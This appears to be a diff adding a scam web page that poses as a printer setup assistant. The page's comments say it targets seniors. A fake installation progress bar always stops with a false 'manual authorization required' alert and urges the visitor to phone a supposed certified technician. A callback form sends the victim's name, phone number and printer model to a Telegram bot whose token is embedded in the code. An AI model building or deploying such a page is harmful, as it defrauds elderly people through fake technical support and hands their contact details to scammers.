@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Printer Setup | Technician Assistance</title>
+    
+    <meta name="robots" content="noindex, nofollow">
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        /* --- THEME FOR SENIORS (High Contrast, Clear) --- */
+        :root {
+            --primary: #0066cc;       /* Strong Blue */
+            --primary-dark: #004c99;
+            --urgent: #d32f2f;        /* Alert Red */
+            --bg: #f4f7f6;
+            --white: #ffffff;
+            --text-dark: #222222;
+            --text-gray: #555555;
+            --success: #2e7d32;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background-color: var(--bg); color: var(--text-dark); min-height: 100vh; display: flex; flex-direction: column; }
+
+        /* HEADER */
+        header { background: var(--white); padding: 15px 0; border-bottom: 2px solid #e0e0e0; position: sticky; top: 0; z-index: 100; }
+        .header-content { max-width: 900px; margin: 0 auto; padding: 0 20px; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-size: 18px; font-weight: 700; color: var(--text-dark); display: flex; align-items: center; gap: 8px; }
+        
+        /* "Live" Indicator for Seniors */
+        .live-status { background: #e8f5e9; color: var(--success); padding: 5px 12px; border-radius: 50px; font-weight: 700; font-size: 14px; display: flex; align-items: center; gap: 8px; border: 1px solid #c8e6c9; }
+        .blink-dot { width: 10px; height: 10px; background: var(--success); border-radius: 50%; animation: pulse 1.5s infinite; }
+
+        /* MAIN CONTAINER */
+        .main-container { flex: 1; display: flex; justify-content: center; padding: 30px 20px; }
+        .card { background: var(--white); width: 100%; max-width: 850px; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.08); overflow: hidden; min-height: 500px; display: flex; flex-direction: column; }
+
+        /* --- STAGE 1: SIMULATOR (Easy Input) --- */
+        .sim-wrapper { padding: 40px; text-align: center; max-width: 600px; margin: 0 auto; }
+        .sim-title { font-size: 26px; font-weight: 800; margin-bottom: 10px; color: var(--text-dark); }
+        .sim-desc { font-size: 16px; color: var(--text-gray); margin-bottom: 30px; }
+        
+        .input-large { width: 100%; padding: 16px; border: 2px solid #ccc; border-radius: 8px; font-size: 18px; margin-bottom: 20px; outline: none; }
+        .input-large:focus { border-color: var(--primary); }
+
+        .btn-start { background: var(--primary); color: white; border: none; padding: 18px; font-size: 20px; font-weight: 700; border-radius: 8px; cursor: pointer; width: 100%; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .btn-start:hover { background: var(--primary-dark); }
+
+        /* LOADING BAR */
+        .loader-box { display: none; margin-top: 30px; text-align: left; }
+        .progress-track { height: 10px; background: #eee; border-radius: 5px; overflow: hidden; margin-bottom: 10px; }
+        .progress-fill { height: 100%; background: var(--primary); width: 0%; transition: width 0.3s; }
+        .status-msg { font-weight: 600; font-size: 15px; color: var(--text-dark); }
+
+        /* --- PROFESSIONAL STEP INDICATOR (NEW) --- */
+        .step-progress-wrapper {
+            background: #e6f7ff;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--primary);
+            text-align: left;
+        }
+        .step-progress-item { display: flex; align-items: center; gap: 8px; margin-bottom: 5px; }
+        .step-progress-item i { color: #f59e0b; } /* Warning/Working color */
+
+
+        /* --- STAGE 2: THE "EAGER" ACTION PAGE (Hidden) --- */
+        #actionSection { display: none; animation: slideUp 0.6s ease-out; }
+        .split-grid { display: grid; grid-template-columns: 1fr 1fr; height: 100%; }
+
+        /* LEFT SIDE: URGENCY & CALL */
+        .left-panel { background: #fffbfb; padding: 30px; border-right: 1px solid #eee; display: flex; flex-direction: column; justify-content: center; }
+        
+        .alert-message { background: #ffebee; color: #b71c1c; padding: 15px; border-radius: 8px; border-left: 5px solid #d32f2f; margin-bottom: 20px; font-size: 15px; line-height: 1.5; }
+        
+        /* The "Old Man" Call Button - HUGE & PULSING */
+        .call-card { 
+            background: white; border: 2px solid #e0e0e0; border-radius: 10px; 
+            padding: 25px; text-align: center; box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+            transition: transform 0.2s; cursor: pointer; text-decoration: none; display: block;
+        }
+        .call-card:hover { border-color: var(--urgent); transform: scale(1.02); }
+        
+        .call-text { display: block; font-size: 14px; text-transform: uppercase; font-weight: 700; color: var(--text-gray); margin-bottom: 5px; }
+        .phone-number { font-size: 32px; font-weight: 900; color: var(--urgent); display: block; margin-bottom: 10px; }
+        
+        .technician-status { color: var(--success); font-weight: 700; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 6px; }
+
+        /* RIGHT SIDE: EASY FORM */
+        .right-panel { padding: 30px; background: white; }
+        .form-head { font-size: 20px; font-weight: 800; margin-bottom: 20px; color: var(--primary); }
+        
+        .form-group { margin-bottom: 15px; }
+        .label { font-size: 14px; font-weight: 600; margin-bottom: 5px; display: block; }
+        .input-std { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; background: #fafafa; }
+        
+        .btn-submit { 
+            background: var(--success); color: white; width: 100%; padding: 16px; border: none; 
+            border-radius: 6px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 10px;
+            box-shadow: 0 4px 0 #1b5e20; /* 3D effect for seniors */
+        }
+        .btn-submit:hover { background: #2e7d32; margin-top: 12px; box-shadow: 0 2px 0 #1b5e20; }
+
+        /* Success Screen */
+        .success-screen { display: none; text-align: center; padding: 40px; }
+        .big-check { font-size: 70px; color: var(--success); margin-bottom: 20px; }
+
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+        /* Mobile */
+        @media (max-width: 768px) {
+            .split-grid { grid-template-columns: 1fr; }
+            .left-panel { padding: 25px; border-bottom: 2px solid #eee; border-right: none; }
+            .phone-number { font-size: 28px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-content">
+            <div class="logo">
+                <i class="fa-solid fa-print"></i> &nbsp;Setup Assistant
+            </div>
+            <div class="live-status">
+                <div class="blink-dot"></div> Technician Online
+            </div>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div class="card">
+            
+            <div id="simSection" class="sim-wrapper">
+                
+                <div id="inputBox">
+                    <div style="text-align: center; margin-bottom: 25px;">
+                        <span style="font-size: 14px; font-weight: 700; color: #0078d4; padding: 5px 15px; border: 1px solid #0078d4; border-radius: 50px;">
+                            STEP 1 OF 3
+                        </span>
+                    </div>
+
+                    <i class="fa-solid fa-cloud-arrow-down sim-icon" style="color: #0078d4; margin-bottom: 15px; font-size: 40px;"></i>
+                    <h1 class="sim-title" style="font-size: 28px; font-weight: 800; color: #222;">
+                        Start Your Printer Setup
+                    </h1>
+                    
+                    <div id="inputForm" style="max-width: 400px; margin: 0 auto;">
+                        
+                        <label for="simInput" style="display: block; font-size: 18px; font-weight: 700; margin-bottom: 15px; color: #555; text-align: left;">
+                            Enter Your Printer Model Name/Number:
+                        </label>
+                        
+                        <div style="position: relative; margin-bottom: 15px;">
+                            <i class="fa-solid fa-barcode" style="position: absolute; left: 15px; top: 18px; color: #999;"></i>
+                            <input 
+                                type="text" 
+                                id="simInput" 
+                                class="input-large" 
+                                placeholder="Ex: 5540, Pro Series, or just the number..." 
+                                style="padding-left: 45px; height: 55px; border-radius: 6px; font-size: 18px; border: 2px solid #ccc;" 
+                                required
+                            >
+                        </div>
+
+                        <button onclick="startSimulation()" class="btn-start" style="font-size: 20px; padding: 18px; margin-top: 10px;">
+                            Start Installation <i class="fa-solid fa-arrow-right"></i>
+                        </button>
+                        
+                        <p style="margin-top: 15px; font-size: 14px; color: #888;">
+                            <i class="fa-solid fa-lock"></i> Connection is Secure.
+                        </p>
+                    </div>
+                </div>
+
+                <div id="loaderBox" class="loader-box">
+                    <div class="step-progress-wrapper" id="stepProgress">
+                         </div>
+                    <div class="progress-track">
+                        <div class="progress-fill" id="progressBar"></div>
+                    </div>
+                    <div class="status-msg" id="statusMsg">Initializing configuration wizard...</div>
+                </div>
+            </div>
+
+            <div id="actionSection">
+                <div class="split-grid">
+                    
+                    <div class="left-panel">
+                        <div class="alert-message">
+                            <strong>Setup Paused:</strong> Manual authorization is required to connect this printer securely.
+                        </div>
+
+                        <p style="text-align: center; margin-bottom: 15px; font-weight: 600;">
+                            Speak to a human to finish setup:
+                        </p>
+
+                        <a href="tel:+18001234567" class="call-card">
+                            <span class="call-text">Click to Call Expert</span>
+                            <span class="phone-number">+1 (760) 274-0601</span>
+                            <span class="technician-status">
+                                <i class="fa-solid fa-headset"></i> Agent Ready (0 min wait)
+                            </span>
+                        </a>
+
+                        <div style="margin-top: 20px; text-align: center; font-size: 13px; color: #666;">
+                            <i class="fa-solid fa-shield-halved"></i> Certified Official Technician
+                        </div>
+                    </div>
+
+                    <div class="right-panel" id="formPanel">
+                        <div class="form-head">
+                            <i class="fa-solid fa-calendar-check"></i> Or Request a Callback
+                        </div>
+                        
+                        <form onsubmit="sendTelegram(event)">
+                            <div class="form-group">
+                                <label class="label">Your Name</label>
+                                <input type="text" id="name" class="input-std" required placeholder="Enter Name">
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="label">Phone Number</label>
+                                <input type="tel" id="phone" class="input-std" required placeholder="(XXX) XXX-XXXX">
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="label">Printer Model</label>
+                                <input type="text" id="model" class="input-std" readonly style="background: #eee; color: #555;">
+                            </div>
+
+                            <button type="submit" id="submitBtn" class="btn-submit">
+                                Call Me Back Now
+                            </button>
+                        </form>
+                    </div>
+
+                    <div id="successPanel" class="success-screen">
+                        <i class="fa-solid fa-circle-check big-check"></i>
+                        <h2 style="margin-bottom: 15px;">Request Received!</h2>
+                        <p style="font-size: 18px; color: #444; margin-bottom: 30px;">
+                            Technician <strong>Mark</strong> has received your request and will call you in 2 minutes.
+                        </p>
+                        <a href="tel:+18001234567" class="btn-start" style="text-decoration: none;">
+                            Call Now: +1 (760) 274-0601
+                        </a>
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        // FUNCTION NAME CORRECTION (startSim -> startSimulation)
+        function startSimulation() {
+            const val = document.getElementById('simInput').value;
+            if(val.length < 2) { alert("Please enter model number."); return; }
+
+            // UI Changes
+            document.getElementById('inputBox').style.display = 'none';
+            document.getElementById('loaderBox').style.display = 'block';
+            
+            // Pass Data to Form
+            document.getElementById('model').value = val;
+
+            // --- PROFESSIONAL PROGRESS LOGIC ---
+            let w = 0;
+            let currentStage = 1;
+            const bar = document.getElementById('progressBar');
+            const status = document.getElementById('statusMsg');
+            const stepArea = document.getElementById('stepProgress');
+            const totalTime = 12000; // 12 seconds total simulation time
+            let isPaused = false;
+
+            // Initial Step Status
+            stepArea.innerHTML = `
+                <div class="step-progress-item"><i class="fa-solid fa-gear"></i> Initializing Scan...</div>
+                <div class="step-progress-item"><i class="fa-solid fa-lock"></i> Verifying Security...</div>
+                <div class="step-progress-item" id="stage3"><i class="fa-solid fa-circle"></i> Connecting to Network...</div>
+            `;
+
+
+            const timer = setInterval(() => {
+                if(isPaused) return;
+
+                w += 1; // Slow increment for realism
+                bar.style.width = w + "%";
+                
+                // STAGE 1: IDENTIFICATION (0-30%)
+                if(w < 30) {
+                    status.innerText = "1. Identifying drivers for " + val + "...";
+                } 
+                
+                // PAUSE 1: Driver Verification Check
+                if (w === 30 && currentStage === 1) {
+                    isPaused = true;
+                    status.innerText = "Verifying driver signature. Please wait...";
+                    stepArea.innerHTML += `<div class="step-progress-item" style="color: #f59e0b;"><i class="fa-solid fa-pause"></i> PAUSED: Driver verification taking longer...</div>`;
+                    
+                    setTimeout(() => {
+                        isPaused = false;
+                        currentStage = 2;
+                        // Mark Stage 1 as done
+                        status.innerText = "Resuming installation...";
+                        stepArea.innerHTML = stepArea.innerHTML.replace("Initializing Scan...", "Scan Complete.");
+                        stepArea.innerHTML = stepArea.innerHTML.replace("Verifying Security...", "Security Verified.");
+                        stepArea.innerHTML = stepArea.innerHTML.replace("PAUSED: Driver verification taking longer...", "Driver Verified.");
+                    }, 1500); // Pause for 1.5 seconds
+                }
+
+                // STAGE 2: INSTALLATION (30-70%)
+                if (w > 30 && w < 70) {
+                    status.innerText = "2. Copying essential configuration files...";
+                }
+
+                // PAUSE 2: Network Handshake Attempt
+                if (w === 70 && currentStage === 2) {
+                    isPaused = true;
+                    status.innerText = "Attempting wireless network handshake...";
+                    
+                    setTimeout(() => {
+                        isPaused = false;
+                        currentStage = 3;
+                        status.innerText = "3. Finalizing setup and testing connection...";
+                    }, 2000); // Pause for 2 seconds
+                }
+
+                // STAGE 3: FINISH & INTERRUPT (70-100%)
+                if (w >= 100) {
+                    clearInterval(timer);
+                    setTimeout(() => {
+                        document.getElementById('simSection').style.display = 'none';
+                        document.getElementById('actionSection').style.display = 'block';
+                    }, 500);
+                }
+            }, 80); // Slower interval for 12-15 second simulation
+        }
+
+        // --- TELEGRAM LOGIC ---
+        function sendTelegram(e) {
+            e.preventDefault(); 
+            const btn = document.getElementById('submitBtn');
+            btn.innerText = "Sending...";
+            btn.disabled = true;
+
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const model = document.getElementById('model').value;
+
+            // YOUR TOKENS (PRESERVED)
+            const botToken = "7764513169:AAFpRf8WQ6WE7DymOqMgTxXjv6BUSZe2734";
+            const chatId = "1684000886";
+
+            const msg = `🔔 *URGENT LEAD* 🔔\n👤 ${name}\n📞 ${phone}\n🖨 ${model}\n⚠️ Manual Setup Requested`;
+            
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+
+            fetch(url).then(res => {
+                document.getElementById('formPanel').style.display = 'none';
+                document.getElementById('successPanel').style.display = 'block';
+            }).catch(err => {
+                alert("Please call us directly.");
+                btn.innerHTML = "Try Again";
+                btn.disabled = false;
+            });
+        }
+    </script>
+
+</body>
+</html>
